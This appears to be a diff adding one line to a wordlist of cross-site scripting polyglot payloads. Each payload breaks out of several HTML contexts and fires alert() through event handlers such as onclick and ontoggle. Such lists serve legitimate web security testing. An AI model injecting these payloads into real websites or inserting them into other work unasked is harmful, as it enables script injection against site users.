@@ -13,3 +13,4 @@ javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert(
 /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
 javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
